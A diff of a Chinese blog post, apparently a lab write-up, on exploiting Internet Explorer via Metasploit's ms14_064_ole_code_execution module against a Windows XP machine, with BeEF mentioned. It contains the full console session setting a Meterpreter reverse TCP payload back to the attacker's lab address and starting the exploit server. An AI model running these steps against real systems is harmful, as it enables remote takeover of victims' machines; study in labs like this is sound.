@@ -7,12 +7,12 @@
   
   <title>BEEF+MSF | Wker</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="内网渗透通过IE的漏洞提升我们的权限 环境攻击机：Kali(192.168.209.138)靶机：32位XP(192.168.209.129)我们使用BEEF+MSF##攻击流程我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下： 123456789101112131415">
+  <meta name="description" content="内网渗透通过IE的漏洞提升我们的权限 环境攻击机：Kali(192.168.209.138)靶机：32位XP(192.168.209.129)我们使用BEEF+MSF 攻击流程我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下： 1234567891011121314151">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BEEF+MSF">
 <meta property="og:url" content="http://yoursite.com/2020/01/06/BEEF-MSF/index.html">
 <meta property="og:site_name" content="Wker">
-<meta property="og:description" content="内网渗透通过IE的漏洞提升我们的权限 环境攻击机：Kali(192.168.209.138)靶机：32位XP(192.168.209.129)我们使用BEEF+MSF##攻击流程我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下： 123456789101112131415">
+<meta property="og:description" content="内网渗透通过IE的漏洞提升我们的权限 环境攻击机：Kali(192.168.209.138)靶机：32位XP(192.168.209.129)我们使用BEEF+MSF 攻击流程我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下： 1234567891011121314151">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img1.jpg">
 <meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img2.jpg">
@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img7.jpg">
 <meta property="og:image" content="http://yoursite.com/2020/01/06/BEEF-MSF/img8.jpg">
 <meta property="article:published_time" content="2020-01-06T10:59:02.000Z">
-<meta property="article:modified_time" content="2020-01-09T03:40:38.634Z">
+<meta property="article:modified_time" content="2020-01-09T03:47:48.184Z">
 <meta property="article:author" content="Wker">
 <meta property="article:tag" content="内网入侵">
 <meta name="twitter:card" content="summary">
@@ -103,7 +103,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF<br>##攻击流程<br>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
 
 <p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
